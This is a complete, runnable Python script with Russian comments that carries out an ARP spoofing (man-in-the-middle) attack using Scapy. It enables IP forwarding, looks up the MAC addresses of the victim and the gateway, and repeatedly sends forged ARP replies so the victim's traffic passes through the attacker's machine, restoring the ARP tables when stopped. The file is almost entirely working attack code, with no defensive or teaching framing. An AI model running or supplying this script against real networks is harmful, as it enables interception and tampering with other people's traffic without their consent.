#!/usr/bin/env python3
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp
from scapy.config import conf
from scapy.arch import get_if_list

import argparse
import os
import sys
import time


def get_mac(ip, iface, timeout=1.0, retries=3):
    """Возвращает MAC по IP или None. Пробует несколько раз."""
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    for _ in range(retries):
        answered, _ = srp(request, timeout=timeout, iface=iface, verbose=False)
        if answered:
            return answered[0][1].hwsrc
    return None


def spoof(target_ip, target_mac, spoof_ip, interface="eth0"):
    """Отправляем фальшивый ARP-ответ на Layer 2 (без варнингов)"""
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # sendp отправляет пакеты на 2-м уровне (Data Link)
    sendp(packet, iface=interface, verbose=False)


def restore(target_ip, target_mac, host_ip, host_mac, interface="eth0"):
    """Восстанавливаем нормальные ARP-таблицы"""
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    sendp(packet, count=8, iface=interface, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing с помощью Scapy")
    parser.add_argument("-t", "--target", required=True, help="IP жертвы")
    parser.add_argument("-g", "--gateway", required=True, help="IP шлюза (роутера)")
    parser.add_argument("-i", "--interface", default="eth0", help="Сетевой интерфейс (по умолчанию eth0)")

    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    interface = args.interface

    # IP forwarding (Linux)
    def set_ip_forward(enable: bool):
        """Включает/выключает IP forwarding. Возвращает True при успехе."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1" if enable else "0")
            return True
        except OSError as e:
            print(f"[-] Не удалось изменить ip_forward: {e}")
            return False

    if not set_ip_forward(True):
        print("[-] Не удалось включить ip_forward. Прерываю.")
        sys.exit(1)

    # Сначала определяем MAC-адреса
    print("[*] Получение MAC-адреса жертвы...")
    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        print(f"[-] Не удалось получить MAC для жертвы ({target_ip}). Проверь сеть.")
        sys.exit(1)
    print(f"[+] MAC жертвы: {target_mac}")

    print("[*] Получение MAC-адреса шлюза...")
    gateway_mac = get_mac(gateway_ip, interface)
    if not gateway_mac:
        print(f"[-] Не удалось получить MAC для шлюза ({gateway_ip}). Проверь сеть.")
        sys.exit(1)
    print(f"[+] MAC шлюза: {gateway_mac}")

    print(f"\n[+] Запуск ARP Spoofing на интерфейсе {interface}...")
    print("[+] Нажми Ctrl+C для остановки\n")

    try:
        sent_packets = 0
        while True:
            # Отправляем таргетные пакеты
            spoof(target_ip, target_mac, gateway_ip, interface)
            spoof(gateway_ip, gateway_mac, target_ip, interface)
            sent_packets += 2
            print(f"\r[+] Отправлено пакетов: {sent_packets}", end="")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[!] Останавливаем атаку и восстанавливаем ARP-таблицы...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        restore(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        print("[+] Атака завершена. ARP-таблицы восстановлены.")

    except Exception as e:
        print(f"[!] Ошибка: {e}")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Запусти скрипт от root (sudo)!")
        sys.exit(1)
    main()